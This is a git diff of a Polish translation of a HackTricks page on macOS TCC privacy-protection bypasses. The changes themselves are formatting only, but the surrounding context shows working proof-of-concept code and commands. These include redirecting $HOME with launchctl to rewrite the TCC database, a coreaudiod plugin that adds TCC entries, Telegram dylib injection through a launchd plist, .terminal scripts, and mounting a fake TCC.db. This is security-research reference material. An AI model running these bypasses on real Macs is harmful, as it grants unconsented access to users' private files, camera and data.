@@ -19,6 +19,7 @@ Inne sposoby wsparcia HackTricks:
 ### Bypass zapisu
 
 To nie jest bypass, to po prostu sposób działania TCC: **Nie chroni przed zapisem**. Jeśli Terminal **nie ma dostępu do odczytu Pulpitu użytkownika, nadal może w niego zapisywać**:
+
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -28,13 +29,14 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
+
 **Rozszerzony atrybut `com.apple.macl`** jest dodawany do nowego **pliku**, aby umożliwić aplikacji twórcy dostęp do odczytu.
 
 ### TCC ClickJacking
 
 Jest możliwe **umieszczenie okna nad monitem TCC**, aby użytkownik **zaakceptował** to bez zauważenia. Możesz znaleźć PoC w [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**
 
-<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/pl/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
 ### TCC Żądanie pod dowolną nazwą
 
@@ -75,7 +77,7 @@ Uprawnienie **`com.apple.private.icloud-account-access`** pozwala na komunikacj�
 
 **iMovie** i **Garageband** miały to uprawnienie i inne, które pozwalały.
 
-Aby uzyskać więcej **informacji** na temat wykorzystania do **uzyskania tokenów iCloud** z tego uprawnienia, sprawdź prezentację: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Aby uzyskać więcej **informacji** na temat wykorzystania do **uzyskania tokenów iCloud** z tego uprawnienia, sprawdź prezentację: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automatyzacja
 
@@ -108,12 +110,15 @@ end tell
 end tell
 ```
 {% endcode %}
+
 ```bash
 osascript iterm.script
 ```
+
 #### Nad Finderem
 
 Jeśli aplikacja ma dostęp nad Finderem, może uruchomić skrypt podobny do tego:
+
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -123,6 +128,7 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
+
 ## Według zachowania aplikacji
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
@@ -132,6 +138,7 @@ Demon **tccd** w przestrzeni użytkownika używa zmiennej środowiskowej **`HOME
 Zgodnie z [tym postem na Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i ponieważ demon TCC działa za pośrednictwem `launchd` w dziedzinie bieżącego użytkownika, możliwe jest **kontrolowanie wszystkich zmiennych środowiskowych** przekazywanych do niego.\
 W związku z tym **atakujący mógłby ustawić zmienną środowiskową `$HOME`** w **`launchctl`** tak, aby wskazywała na **kontrolowany** **katalog**, **ponownie uruchomić** demona **TCC**, a następnie **bezpośrednio modyfikować bazę danych TCC**, aby nadać sobie **wszystkie dostępne uprawnienia TCC** bez konieczności pytania użytkownika końcowego.\
 PoC:
+
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
@@ -158,6 +165,7 @@ NULL,
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
+
 ### CVE-2021-30761 - Notatki
 
 Notatki miały dostęp do chronionych lokalizacji TCC, ale gdy notatka jest tworzona, jest to **tworzone w lokalizacji niechronionej**. Dlatego można było poprosić o skopiowanie chronionego pliku do notatki (czyli do lokalizacji niechronionej) i następnie uzyskać dostęp do pliku:
@@ -189,10 +197,12 @@ Jeśli **`SQLITE_SQLLOG_DIR="ścieżka/folder"`**, oznacza to w zasadzie, że **
 Jeśli zmienna środowiskowa **`SQLITE_AUTO_TRACE`** jest ustawiona, biblioteka **`libsqlite3.dylib`** zacznie **logować** wszystkie zapytania SQL. Wiele aplikacji używało tej biblioteki, więc było możliwe zalogowanie wszystkich ich zapytań SQLite.
 
 Kilka aplikacji Apple używało tej biblioteki do uzyskiwania dostępu do chronionych informacji TCC.
+
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
+
 ### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407
 
 Ta **zmienna środowiskowa jest używana przez framework `Metal`**, który jest zależnością różnych programów, w tym głównie `Music`, który ma FDA.
@@ -284,11 +294,13 @@ Aplikacja `/System/Library/CoreServices/Applications/Directory Utility.app` mia�
 Aby uzbroić to CVE, **`NFSHomeDirectory`** jest **zmieniany** (nadużywając poprzedniego entitlementu), aby móc **przejąć bazę danych TCC użytkowników** w celu ominięcia TCC.
 
 Aby uzyskać więcej informacji, sprawdź [**oryginalny raport**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
+
 ### CVE-2020-29621 - Coreaudiod
 
 Binarny **`/usr/sbin/coreaudiod`** miał uprawnienia `com.apple.security.cs.disable-library-validation` oraz `com.apple.private.tcc.manager`. Pierwsze umożliwia **wstrzykiwanie kodu**, a drugie daje dostęp do **zarządzania TCC**.
 
 Ten binarny pozwalał na ładowanie **wtyczek firm trzecich** z folderu `/Library/Audio/Plug-Ins/HAL`. Dlatego było możliwe **załadowanie wtyczki i nadużycie uprawnień TCC** za pomocą tego PoC:
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -315,6 +327,7 @@ add_tcc_entry();
 NSLog(@"[+] Exploitation finished...");
 exit(0);
 ```
+
 Dla dalszych informacji sprawdź [**oryginalny raport**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
 
 ### Wtyczki warstwy abstrakcji urządzenia (DAL)
@@ -328,6 +341,7 @@ Kilka aplikacji Apple było podatnych na to.
 ### Firefox
 
 Aplikacja Firefox miała uprawnienia `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:
+
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -353,6 +367,7 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </dict>
 </plist>
 ```
+
 Dla dalszych informacji na temat łatwego wykorzystania tego [**sprawdź oryginalny raport**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
 
 ### CVE-2020-10006
@@ -364,6 +379,7 @@ Binarny plik `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` miał up
 Telegram miał uprawnienia **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, więc było możliwe nadużycie go do **uzyskania dostępu do swoich uprawnień**, takich jak nagrywanie za pomocą kamery. Możesz [**znaleźć ładunek w opisie**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
 Zauważ, jak użyć zmiennej środowiskowej do załadowania biblioteki, został utworzony **niestandardowy plist** do wstrzyknięcia tej biblioteki, a **`launchctl`** został użyty do jej uruchomienia:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -393,6 +409,7 @@ Zauważ, jak użyć zmiennej środowiskowej do załadowania biblioteki, został 
 ```bash
 launchctl load com.telegram.launcher.plist
 ```
+
 ## Poprzez otwieranie wywołań
 
 Możliwe jest wywołanie **`open`** nawet podczas działania w piaskownicy.
@@ -402,6 +419,7 @@ Możliwe jest wywołanie **`open`** nawet podczas działania w piaskownicy.
 Jest dość powszechne, aby nadać terminalowi **Pełny dostęp do dysku (FDA)**, przynajmniej na komputerach używanych przez osoby techniczne. I możliwe jest wywołanie skryptów **`.terminal`** z jego użyciem.
 
 Skrypty **`.terminal`** to pliki plist, takie jak ten z poleceniem do wykonania w kluczu **`CommandString`**:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -419,7 +437,9 @@ Skrypty **`.terminal`** to pliki plist, takie jak ten z poleceniem do wykonania 
 </dict>
 </plist>
 ```
+
 Aplikacja mogłaby zapisać skrypt terminala w lokalizacji takiej jak /tmp i uruchomić go za pomocą komendy:
+
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -430,6 +450,7 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
+
 ## Poprzez montowanie
 
 ### CVE-2020-9771 - mount\_apfs - bypass TCC i eskalacja uprawnień
@@ -476,6 +497,7 @@ hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TC
 hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
 ```
 {% endcode %}
+
 ```python
 # This was the python function to create the dmg
 def create_dmg():
@@ -486,6 +508,7 @@ os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
 os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
 os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
+
 Sprawdź **pełne wykorzystanie** w [**oryginalnym opisie**](https://theevilbit.github.io/posts/cve-2021-30808/).
 
 ### asr
